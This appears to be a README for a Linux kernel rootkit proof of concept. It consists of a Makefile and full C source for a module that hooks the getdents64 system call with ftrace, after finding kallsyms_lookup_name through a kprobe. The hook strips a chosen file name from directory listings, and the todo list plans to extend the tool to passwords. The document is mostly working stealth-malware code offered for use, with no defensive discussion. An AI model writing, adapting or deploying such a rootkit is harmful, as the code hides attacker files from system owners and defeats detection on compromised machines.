# File Hider Rootkit

### todo:
- make more inputs
- make like passwords etc (eqgrp)

```Makefile 
obj-m += lkm.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/slab.h>

#define TARGET_FILE "topsecret.txt"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LIW");
MODULE_DESCRIPTION("Active File Hider PoC");

/* Linker Bypass */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t real_kallsyms_lookup_name;

/* Syscall Pointer */
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

/* ---------------------------------------------------------
 * Active Interception Logic 
 * --------------------------------------------------------- */
static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    /* 1. Execute the standard system call first */
    long ret = orig_getdents64(regs);
    
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *dir, *kbuf, *prev = NULL;
    unsigned long offset = 0;
    int err;

    /* If the syscall failed or the directory is empty, disengage */
    if (ret <= 0) return ret;

    /* On x86_64, regs->si holds the pointer to the user's buffer */
    dirent = (struct linux_dirent64 __user *)regs->si;

    /* 2. Allocate secure kernel memory to inspect the data */
    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf) return ret;

    /* 3. Pull the data from user-space into our secure buffer */
    err = copy_from_user(kbuf, dirent, ret);
    if (err) {
        kfree(kbuf);
        return ret;
    }

    /* 4. Traverse the directory list */
    while (offset < ret) {
        dir = (void *)kbuf + offset;
        
        /* Identify the target */
        if (strcmp(dir->d_name, TARGET_FILE) == 0) {
            /* Scrub the entry by merging its length with the adjacent entries */
            if (dir == kbuf) {
                ret -= dir->d_reclen;
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue; 
            } else {
                prev->d_reclen += dir->d_reclen;
            }
        } else {
            prev = dir;
        }
        offset += dir->d_reclen;
    }

    /* 5. Push the modified, clean data back to user-space */
    copy_to_user(dirent, kbuf, ret);
    kfree(kbuf);
    
    return ret;
}

/* ---------------------------------------------------------
 * Ftrace Registration & Boilerplate 
 * --------------------------------------------------------- */
struct ftrace_hook {
    const char *name;
    void *hook_addr;
    void *orig_addr;
    unsigned long address;
    struct ftrace_ops ops;
};

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    /* Recursion Guard: Prevent the hook from hooking itself */
    if (!within_module(parent_ip, THIS_MODULE)) {
        regs->ip = (unsigned long)hook->hook_addr;
    }
}

static struct ftrace_hook demo_hook = {
    .name = "__x64_sys_getdents64",
    .hook_addr = hook_getdents64,
    .orig_addr = &orig_getdents64
};

static int resolve_kallsyms_address(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0) return ret;
    real_kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

static int __init hook_init(void) {
    int err;
    if (resolve_kallsyms_address() < 0) return -ENOENT;

    demo_hook.address = real_kallsyms_lookup_name(demo_hook.name);
    if (!demo_hook.address) return -ENOENT;
    
    *((unsigned long*)demo_hook.orig_addr) = demo_hook.address;

    demo_hook.ops.func = fh_ftrace_thunk;
    demo_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&demo_hook.ops, demo_hook.address, 0, 0);
    if (err) return err;

    err = register_ftrace_function(&demo_hook.ops);
    if (err) return err;

    pr_info("Active evasion deployed.\n");
    return 0;
}

static void __exit hook_exit(void) {
    unregister_ftrace_function(&demo_hook.ops);
    ftrace_set_filter_ip(&demo_hook.ops, demo_hook.address, 1, 0);
    pr_info("Exfiltrated.\n");
}

module_init(hook_init);
module_exit(hook_exit);
```
